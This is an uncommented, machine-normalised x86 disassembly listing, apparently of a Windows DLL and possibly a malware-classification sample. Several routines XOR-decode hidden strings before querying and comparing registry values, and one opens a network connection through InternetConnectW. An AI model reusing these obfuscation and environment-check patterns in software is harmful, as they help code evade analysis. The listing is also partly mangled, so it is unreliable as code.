mov [ ebp - 0x30 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x50 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0xfc ] 0x8
lea eax [ edi + 0xe8 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x2c ]
mov eax 0x12b
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_1002f620
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0x90 ]
push eax
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0x90 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x83
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0x94 ] ebx
call sub_1002f620
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x98 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0x8c ]
mov eax 0x51
call sub_1002f620
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
lea edx [ ebp - 0x94 ]
push edx
mov edx [ ebp - 0x90 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x94 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0x5a
call sub_1002f620
mov [ ebp - 0x9c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x90 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x94 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0x9c ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_100679bd
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0xc ]
call sub_1001f6ab
pop ecx
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call sub_10004c10
mov eax [ ebp + 0x8 ]
leave
retn 0x8
sub_100679ed
push 0x28
mov eax sub_10085e3c
call sub_10026266
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ edi ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
mov [ esi + 0x4 ] ebx
push ecx
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x28 ] bl
call sub_1002227e
mov [ esi ] r--data
jmp r-xdata
sub_10067ab7
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001de6b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10067b60
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffc
and edx 0xff
mov [ ebp + eax * 2 - 0x44 ] dx
inc eax
cmp eax 0x19
jb r-xdata
push esi
mov esi [ RegOpenKeyExW@IAT ]
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
xor eax eax
push eax
lea edx [ ebp - 0x44 ]
push edx
push 0x80000002
mov [ ebp - 0x12 ] ax
call esi
test eax eax
jne r-xdata
push ebx
push edi
lea edx [ ebp - 0xa0 ]
mov eax 0x1f
call sub_10037e30
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
mov ebx [ RegQueryValueExW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x304 ]
push eax
call [ RegCloseKey@IAT ]
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xf8 ]
mov eax 0x3
call sub_10037e30
lea ecx [ ebp - 0x304 ]
push ecx
push 0x1
push 0x0
push edx
push 0x80000002
call esi
test eax eax
jne r-xdata
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x300 ]
[ edi ]
lea edx [ ebp - 0x68 ]
mov eax 0x14
mov [ ebp - 0x308 ] 0x206
call sub_10037e30
lea eax [ ebp - 0x308 ]
push eax
mov eax [ ebp - 0x304 ]
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop ebx
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x300 ]
[ edi ]
lea edx [ ebp - 0x30c ]
mov eax 0x2b
mov [ ebp - 0x308 ] 0x206
call sub_10037e30
lea eax [ ebp - 0x308 ]
push eax
mov eax [ ebp - 0x304 ]
lea ecx [ ebp - 0x300 ]
push ecx
push 0x0
push 0x0
push edx
push eax
call ebx
test eax eax
jne r-xdata
lea edx [ ebp - 0x300 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x2a
call sub_10037e30
mov eax edx
push eax
lea ecx [ ebp - 0x300 ]
push ecx
call sub_1000b388
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x304 ]
push ecx
jmp r-xdata
lea edx [ ebp - 0x300 ]
push edx
call [ CharUpperW@IAT ]
lea edx [ ebp - 0x10 ]
mov eax 0x23
call sub_10037e30
mov eax edx
push eax
lea ecx [ ebp - 0x300 ]
push ecx
call sub_1000b388
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x304 ]
push edx
call [ RegCloseKey@IAT ]
pop edi
pop ebx
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x304 ]
push eax
call [ RegCloseKey@IAT ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x304 ]
push eax
sub_10067db0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087f50
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp + 0xc ]
call sub_10051db0
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] edi
mov esi [ ebp - 0x10 ]
test esi esi
je r-xdata
or edi 0xffffffff
mov [ ebp - 0x4 ] edi
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x10 ] 0x0
call sub_100310b0
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x14 ]
test edx edx
jne r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
mov edx edi
[ ecx ] edx
jne r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
lea edx [ esi + 0x4 ]
mov eax edi
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
[ eax ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
[ ecx ] edi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
sub_10067f10
push ebp
mov ebp esp
sub esp 0x480
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov [ ebp - 0x474 ] eax
mov [ ebp - 0x470 ] 0x0
xor eax eax
mov edi edi
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x36
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x2d
jb r-xdata
lea ecx [ ebp - 0x46c ]
push ecx
push 0x2011b
xor eax eax
push eax
lea edx [ ebp - 0x60 ]
push edx
push 0x80000001
mov [ ebp - 0x6 ] ax
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x46c ]
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x470 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push ebx
push edi
lea eax [ ebp - 0x468 ]
push eax
lea ecx [ ebp - 0x268 ]
push ecx
lea edx [ ebp - 0x470 ]
push edx
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x46c ]
push ecx
lea edx [ ebp - 0x474 ]
push edx
lea edi [ ebp - 0x478 ]
lea ebx [ ebp - 0x47c ]
call sub_1001fbe0
mov eax [ ebp - 0x46c ]
add esp 0x18
push eax
call [ RegCloseKey@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x46c ]
push edx
call [ RegCloseKey@IAT ]
mov eax 0x2
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1006803e
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_1001b2d2
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1006807b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx eax
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov cx [ ebp + 0xc ]
cmp [ eax ] cx
je r-xdata
cmp [ eax ] cx
jne r-xdata
pop ebp
retn
xor eax eax
sub eax 0x2
cmp eax edx
je r-xdata
sub_100680a9
push 0x28
mov eax sub_10085e3c
call sub_10026266
and [ ebp - 0x10 ] 0x0
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x34
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
xor ecx ecx
inc ecx
mov [ ebp - 0x10 ] ecx
push ecx
mov [ esi + 0x28 ] cl
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
call sub_1002227e
mov [ esi ] r--data
jmp r-xdata
sub_10068140
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x18 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
sub esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
sub edi [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ebx [ eax ]
mov eax [ eax + 0x4 ]
call sub_1006e175
mov ebx [ eax + 0x4 ]
call sub_1006a296
jmp r-xdata
push eax
push edi
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
push 0x1000
push ebx
push 0x0
call sub_1001cd1a
add esp 0x20
test eax eax
jne r-xdata
mov eax esi
cmp esi edi
jl r-xdata
test ebx ebx
jne r-xdata
sub eax 0x2
call sub_1005b670
mov [ eax ] 0x16
mov eax 0x7fffffff
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1004ccb9
add esp 0xc
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn
cmp esi edi
je r-xdata
cmp esi edi
setge al
lea eax [ eax + eax - 0x1 ]
jmp r-xdata
sub_100681e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084f3b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x18 ]
mov ecx [ ecx ]
push 0x1
push eax
mov eax [ ebp + 0x14 ]
push 0x3
push edx
mov edx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push edx
push eax
push ecx
call [ InternetConnectW@IAT ]
xor edx edx
mov esi eax
test esi esi
setne dl
push edx
call sub_10023cc0
add esp 0x4
test esi esi
je r-xdata
xor eax eax
push 0x4
call sub_1002e3ac
add esp 0x4
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
push esi
mov ecx eax
call sub_10002270
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_10068272
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_10051cf5
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100495e4
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_1004067f
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
sub_10068320
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0xfb
cmp eax 0x4
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x30 ]
mov [ esi ] eax
mov eax [ ecx + 0x34 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x68
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn
call sub_1002f620
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_100683a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100861a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi edx
cmp edi 0x7ffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x5
cmp eax edi
jae r-xdata
push r--data
call sub_10030594
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_1005f620
mov [ ebp - 0x4 ] 0x0
mov ebx [ esi + 0x4 ]
mov edx [ esi ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
push ecx
call sub_10004850
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov ebx eax
add esp 0x4
sub ebx ecx
test ecx ecx
je r-xdata
mov eax [ ebp - 0x14 ]
shl edi 0x5
add edi eax
and ebx 0xffffffe0
add ebx eax
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] ebx
mov [ esi ] eax
cmp ecx eax
je r-xdata
mov edx [ esi ]
push edx
call sub_1000a86e
add esp 0x4
mov edi edi
add ecx 0x20
cmp ecx eax
jne r-xdata
sub_100684a3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1002d269
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1002d269
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_100684cf
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10068565
push 0x8
mov eax sub_10085499
call sub_100259bb
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100575c5
mov ecx [ ebp + 0x8 ]
lea edi [ esi + 0x14 ]
xor ebx ebx
push edi
push ebx
mov [ edi ] eax
mov [ edi + 0x4 ] edx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ ebp - 0x4 ] ebx
call sub_1004ab38
push eax
call sub_10016570
mov ecx [ ebp + 0x8 ]
add esp 0xc
push edi
push ebx
mov [ esi + 0x8 ] eax
call sub_1004a1ad
push eax
call sub_10016570
add esp 0xc
mov [ esi + 0xc ] eax
call sub_1005a906
mov [ esi + 0x10 ] eax
call sub_10008d33
retn 0x4
sub_100685dc
push 0x4
mov eax sub_10085a27
call sub_10026266
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] edi
mov [ esi ] ax
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
sar eax 0x1
mov [ ebp - 0x10 ] 0x1
je r-xdata
push edi
push eax
mov ecx esi
call sub_10065154
mov eax esi
call sub_10008d33
retn 0xc
lea ebx [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x8
jb r-xdata
cmp eax edi
ja r-xdata
push ebx
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push [ ebp + 0xc ]
push eax
push edx
call sub_10041181
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push edi
push eax
mov ecx esi
call sub_10065154
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
sub_10068670
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push ebx
xor ebx ebx
push esi
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb0 ] ebx
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x36
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0x12
jb r-xdata
xor eax eax
lea edx [ ebp - 0xb0 ]
push edx
mov [ ebp - 0x18 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
cmp [ edi + 0x118 ] 0x8
lea eax [ edi + 0x104 ]
jb r-xdata
mov ecx 0x3
lea edx [ ebp - 0x58 ]
mov eax 0x8c
mov [ ebp - 0x14 ] cx
lea esi [ ecx - 0x2 ]
call sub_1002f620
mov ebx [ ebp - 0x14 ]
mov ecx [ edi + 0x1c ]
mov edx [ ecx ]
lea eax [ ebp - 0xb0 ]
push eax
push r--data
lea eax [ ebp - 0x58 ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] ebx
mov ebx [ ebp - 0x10 ]
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] esi
mov esi [ ebp - 0x8 ]
push ecx
mov ecx [ edx + 0xe0 ]
mov [ eax + 0xc ] esi
call ecx
test eax eax
je r-xdata
push eax
call [ SysAllocString@IAT ]
mov esi eax
mov eax [ ebp - 0xb0 ]
mov edx [ eax ]
push esi
push eax
mov eax [ edx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x83
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
call sub_1002f620
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0xb8 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ eax ]
xor ebx ebx
lea edx [ ebp - 0xac ]
mov eax 0x51
call sub_1002f620
mov esi 0x1
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
lea edx [ ebp - 0xb4 ]
push edx
mov edx [ ebp - 0xb0 ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0xb4 ]
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x70 ]
mov eax 0x5a
call sub_1002f620
mov [ ebp - 0xbc ] 0x2
jmp r-xdata
mov eax [ ebp - 0xb0 ]
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xb8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xb4 ] ebx
push esi
call [ SysFreeString@IAT ]
mov esi [ ebp - 0xbc ]
mov ecx [ ebp - 0x4 ]
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1006883a
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_1006885c
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_10063a9a
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_1005b670
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_100405d2
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_10046777
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_10020fd7
pop ecx
test eax eax
jne r-xdata
call sub_100405d2
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
